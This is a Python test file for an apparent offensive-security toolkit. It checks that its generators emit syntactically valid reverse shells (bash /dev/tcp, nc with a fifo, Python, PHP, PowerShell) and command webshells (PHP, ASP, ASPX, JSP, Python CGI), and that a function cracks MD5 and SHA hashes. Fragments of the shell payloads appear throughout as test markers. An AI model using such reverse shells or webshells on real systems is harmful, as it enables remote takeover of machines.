import ast
import base64
import hashlib
import os
from pathlib import Path
import shutil
import subprocess
import sys
import unittest


sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "backend"))

from hacking import crypto, payloads


TELEGRAM_REVERSE_SHELLS = ("bash", "python", "php", "powershell")
TELEGRAM_WEBSHELLS = ("php", "asp", "aspx", "jsp", "py")


class PayloadGeneratorTests(unittest.TestCase):
    def assert_encoded_round_trip(self, result):
        decoded = base64.b64decode(
            result["encoded"], validate=True
        ).decode("utf-8")
        self.assertEqual(decoded, result["decoded"])
        self.assertEqual(
            base64.b64encode(result["decoded"].encode()).decode(),
            result["encoded"],
        )

    def test_generator_key_sets_cover_all_exposed_choices(self):
        expected_reverse = set(TELEGRAM_REVERSE_SHELLS) | {"nc"}
        self.assertEqual(set(payloads.REVERSE_SHELLS), expected_reverse)
        self.assertEqual(set(payloads.WEBSHELLS), set(TELEGRAM_WEBSHELLS))

    def test_all_reverse_shells_interpolate_and_round_trip(self):
        markers = {
            "bash": ("bash -i", "/dev/tcp/8.8.8.8/4444", "0>&1"),
            "python": (
                "socket.create_connection",
                "os.dup2",
                "subprocess.call",
            ),
            "php": ("<?php", "fsockopen", "proc_open", "?>"),
            "powershell": (
                "System.Net.Sockets.TcpClient",
                "GetStream()",
                "while (",
                "Invoke-Expression",
                ".Write(",
                ".Close()",
            ),
        }

        for shell_type in TELEGRAM_REVERSE_SHELLS:
            with self.subTest(shell_type=shell_type):
                result = payloads.reverse_shell("8.8.8.8", 4444, shell_type)
                self.assertNotIn("error", result)
                self.assertEqual(result["type"], shell_type)
                self.assertNotIn("{ip}", result["decoded"])
                self.assertNotIn("{port}", result["decoded"])
                for marker in markers[shell_type]:
                    self.assertIn(marker, result["decoded"])
                if shell_type in {"php", "powershell"}:
                    self.assertEqual(
                        result["decoded"].count("{"),
                        result["decoded"].count("}"),
                    )
                    self.assertEqual(
                        result["decoded"].count("("),
                        result["decoded"].count(")"),
                    )
                self.assert_encoded_round_trip(result)

        nc_result = payloads.reverse_shell("8.8.8.8", 4444, "nc")
        self.assertNotIn("error", nc_result)
        nc_source = nc_result["decoded"]
        self.assertNotIn(" -e ", f" {nc_source} ")
        for marker in (
            'fifo="/tmp/artenisa-$$"',
            'mkfifo "$fifo"',
            'cat "$fifo"',
            "/bin/sh -i 2>&1",
            "| nc 8.8.8.8 4444",
            '> "$fifo"',
            'rm -f "$fifo"',
        ):
            self.assertIn(marker, nc_source)
        self.assert_encoded_round_trip(nc_result)

    def test_python_reverse_shell_is_valid_syntax_and_dual_stack(self):
        source = payloads.reverse_shell(
            "2001:4860:4860::8888", 4444, "python"
        )["decoded"]

        tree = ast.parse(source)
        create_connection_calls = [
            node
            for node in ast.walk(tree)
            if isinstance(node, ast.Call)
            and isinstance(node.func, ast.Attribute)
            and isinstance(node.func.value, ast.Name)
            and node.func.value.id == "socket"
            and node.func.attr == "create_connection"
        ]

        self.assertEqual(len(create_connection_calls), 1)
        endpoint = create_connection_calls[0].args[0]
        self.assertIsInstance(endpoint, ast.Tuple)
        self.assertEqual(
            [element.value for element in endpoint.elts],
            ["2001:4860:4860::8888", 4444],
        )

    def test_php_reverse_shell_brackets_numeric_ipv6(self):
        source = payloads.reverse_shell(
            "2001:4860:4860::8888", 4444, "php"
        )["decoded"]

        self.assertIn("tcp://[2001:4860:4860::8888]:4444", source)
        self.assertEqual(source.count("{"), source.count("}"))

    def test_all_webshells_have_valid_structure(self):
        markers = {
            "php": ("<?php", '$_GET["cmd"]', "system(", "?>"),
            "asp": (
                "<%",
                'Server.CreateObject("WScript.Shell")',
                'Request.QueryString("cmd")',
                "Response.Write",
                "%>",
            ),
            "aspx": (
                '<%@ Page Language="C#" %>',
                '<script runat="server">',
                'Request.QueryString["cmd"]',
                "ProcessStartInfo",
                "</script>",
            ),
            "jsp": (
                '<%@ page import="java.io.*" %>',
                'request.getParameter("cmd")',
                "Runtime.getRuntime().exec",
                "BufferedReader reader",
            ),
            "py": (
                "from urllib.parse import parse_qs",
                'os.environ.get("QUERY_STRING", "")',
                "subprocess.run",
                "Content-Type: text/plain",
            ),
        }

        for language in TELEGRAM_WEBSHELLS:
            with self.subTest(language=language):
                result = payloads.webshell(language)
                self.assertNotIn("error", result)
                self.assertEqual(result["language"], language)
                for marker in markers[language]:
                    self.assertIn(marker, result["decoded"])
                self.assert_encoded_round_trip(result)

                if language in {"aspx", "jsp"}:
                    self.assertEqual(
                        result["decoded"].count("{"),
                        result["decoded"].count("}"),
                    )
                if language in {"asp", "aspx", "jsp"}:
                    self.assertEqual(
                        result["decoded"].count("<%"),
                        result["decoded"].count("%>"),
                    )
                if language == "aspx":
                    self.assertNotIn("<%%", result["decoded"])
                if language == "jsp":
                    self.assertNotIn("<% @", result["decoded"])

    def test_python_cgi_webshell_is_valid_python(self):
        source = payloads.webshell("py")["decoded"]
        ast.parse(source)

    def test_bash_and_nc_parse_when_available(self):
        bash = shutil.which("bash")
        if os.name == "nt":
            git_bash = shutil.which(
                "bash",
                path=str(
                    Path(os.environ.get("ProgramFiles", "C:/Program Files"))
                    / "Git"
                    / "bin"
                ),
            )
            bash = git_bash or bash
        if not bash:
            self.skipTest("bash parser unavailable")

        for shell_type in ("bash", "nc"):
            with self.subTest(shell_type=shell_type):
                source = payloads.reverse_shell(
                    "2001:4860:4860::8888", 4444, shell_type
                )["decoded"]
                result = subprocess.run(
                    [bash, "-n", "-c", source],
                    capture_output=True,
                    text=True,
                    check=False,
                )
                self.assertEqual(result.returncode, 0, result.stderr)

    def test_php_templates_parse_when_available(self):
        php = shutil.which("php")
        if not php:
            self.skipTest("PHP parser unavailable")

        sources = (
            payloads.reverse_shell("2001:4860:4860::8888", 4444, "php")[
                "decoded"
            ],
            payloads.webshell("php")["decoded"],
        )
        for source in sources:
            with self.subTest(source=source.splitlines()[0]):
                result = subprocess.run(
                    [php, "-l"],
                    input=source,
                    capture_output=True,
                    text=True,
                    check=False,
                )
                self.assertEqual(result.returncode, 0, result.stderr)


class HashCrackCaseTests(unittest.TestCase):
    @staticmethod
    def mixed_case(digest):
        letter_index = 0
        result = []
        for character in digest:
            if character.isalpha():
                if letter_index % 2 == 0:
                    character = character.upper()
                letter_index += 1
            result.append(character)
        return "".join(result)

    def test_uppercase_integrated_hash_cracks_and_preserves_input(self):
        original = hashlib.md5(b"password").hexdigest().upper()

        result = crypto.hash_crack(original)

        self.assertTrue(result["cracked"])
        self.assertEqual(result["plaintext"], "password")
        self.assertEqual(result["hash"], original)

    def test_mixed_case_custom_hashes_crack_and_preserve_input(self):
        plaintext = "correct-horse"
        algorithms = {
            "MD5": hashlib.md5,
            "SHA1": hashlib.sha1,
            "SHA224": hashlib.sha224,
            "SHA256": hashlib.sha256,
            "SHA384": hashlib.sha384,
            "SHA512": hashlib.sha512,
        }

        for expected_algorithm, constructor in algorithms.items():
            with self.subTest(algorithm=expected_algorithm):
                digest = constructor(plaintext.encode()).hexdigest()
                original = self.mixed_case(digest)

                result = crypto.hash_crack(original, [plaintext])

                self.assertTrue(result["cracked"])
                self.assertEqual(result["plaintext"], plaintext)
                self.assertEqual(result["algorithm"], expected_algorithm)
                self.assertEqual(result["hash"], original)


if __name__ == "__main__":
    unittest.main()
